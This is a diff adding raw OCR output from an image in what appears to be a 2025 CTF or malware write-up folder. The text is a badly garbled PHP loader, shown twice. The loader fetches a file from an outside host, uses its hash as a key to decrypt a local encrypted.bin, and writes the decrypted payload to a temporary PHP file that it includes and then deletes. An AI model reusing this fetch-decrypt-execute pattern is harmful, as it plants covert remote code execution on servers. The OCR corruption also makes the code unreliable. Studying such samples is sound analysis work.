@@ -1,0 +1,22 @@
+# OCR: a56429003b450594254d9540a0e4f837.webp
+# 来源: .\02-WriteUp\2025\a56429003b450594254d9540a0e4f837.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:34
+
+$a-file_get_contents( ‘https: //foren6. atwebpages . com/woyao/eat/KE7%81SAB%EOKIA%BS / ZEBKOCKB2EBKOCE
+OCKEOKOAKSSXESRBAKOS . c55") ;$b=md5 ($a, true) ;$c=File_get_contents("../../../../encrypted.bin") ;$d=b
+ase64_decode($c) :$
+cbc’ ;$f=openss1_cipher_iv_length($e) ;$
+$b, OPENSSL_RAW_DATA, $g) ;$j=sys_get_temp_dir();$k=
+k,"<2php\n".$i) include $k;unlink($k) syijuhua() ;
+substr($d,0, $F) $h=substr($d, $F) ;$i-openss1_decrypt($h,$e
+J." /Func_’ .unigid().*.php' ;file_put_contents($
+SR LaF OFF
+0 RB BA hd
+wt
++
+$a-file_get_contents( ‘https: //foren6. atwebpages.com/woyao/eat//K#8/HPRR,
+css") ;$b-md5 ($a, true) ;$c=File_get_contents(’../../../../encrypted.bin’) ;$d=base64_decode($c) ;$
+ubstr($d,0, $F); $h=substr($d,$F) ;$i-openss1_decrypt($h, $e
+» $b, OPENSSL_RAW_DATA,$g);$j=sys_get_temp_dir();$k=$j."/func_'.unigid().° .php’ ;file_put_contents($
+k,"<2php\n".$i);include $k;unLink($k) syijuhua() ;
